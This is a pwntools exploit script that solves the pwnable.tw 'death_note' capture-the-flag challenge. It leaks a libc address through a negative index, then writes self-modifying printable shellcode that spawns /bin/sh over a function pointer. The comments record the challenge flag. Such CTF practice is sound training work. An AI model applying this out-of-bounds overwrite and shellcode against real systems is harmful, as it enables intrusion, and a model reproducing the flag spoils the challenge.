#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
import struct

exe = ELF("./death_note")
# context.log_level='debug'
libc = ELF("./libc.so.6")
context.terminal = ["alacritty","-e"]
p = remote("chall.pwnable.tw", 10201)
# p = process([exe.path])
def gdbs():
    gdb.attach(p, gdbscript="""
    call (void)mprotect(0x804b000,0x22000,7)
    b*0x080487EF
    c
               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
# gdbs()
def add(idx,name):
    sla(":","1")
    sla(":",str(idx))
    sla(":",name)
def show(idx):
    sla("choice :","2")
    sla("dex :",str(idx))
def dels(idx):
    sla("choice :","3")
    sla("dex :",str(idx))
show(-7)
p.recvuntil("Name : ")
buffer = p.recvuntil("-----------------------------------",drop=True)
# log.info(f"leak: {leak}")
chunks = [buffer[i:i + 4] for i in range(0, len(buffer), 4)]
for i in range(len(chunks)):
    chunks[i] = u32(chunks[i].ljust(4,b"\0"))
stdout = chunks[1] -71
libc.address = stdout - libc.sym._IO_2_1_stdout_
log.info(f"addr: {hex(stdout)}")
log.info(f"libc: {hex(libc.address)}")

thing = f"""
push 0x22
pop eax
xor al,0x22
push eax
pop ecx

push ecx
push 0x68732f2f     
push 0x6e69622f
push esp
pop ebx

push edx
pop eax
push 0x33
pop edx
sub byte ptr [eax+47],dl
push 0x33
pop edx
sub byte ptr [eax+48],dl
push 0x4d
pop edx
sub byte ptr [eax+48],dl
push 0x22
pop eax
xor al,0x29

push ecx
pop edx
                 """


print(thing)
shellcode = asm(thing,arch='i386')
payload = shellcode
print(f"shellcode: {shellcode}")
print(f"len shell: {len(shellcode)}")

# gdbs()
add(-16,payload)


p.interactive()
#FLAG{sh3llc0d3_is_s0_b34ut1ful}
# good luck pwning :)
#null out eax and ecx
# push 0x22
# pop eax 
# xor al,0x22
# push eax
# pop ecx
#setup parameters on stack
# push ecx
# push 0x68732f2f     
# push 0x6e69622f
# push esp
# pop ebx
#push the address that contain the shellcode and write int 0x80 to the end of the shellcode
# push edx
# pop eax
# push 0x33
# pop edx
# sub byte ptr [eax+47],dl
# push 0x33
# pop edx
# sub byte ptr [eax+48],dl
# push 0x4d
# pop edx
# sub byte ptr [eax+48],dl
# push 0x22
# pop eax
# xor al,0x29
#null out edx, ecx hasn't already nulled out
# push ecx
# pop edx
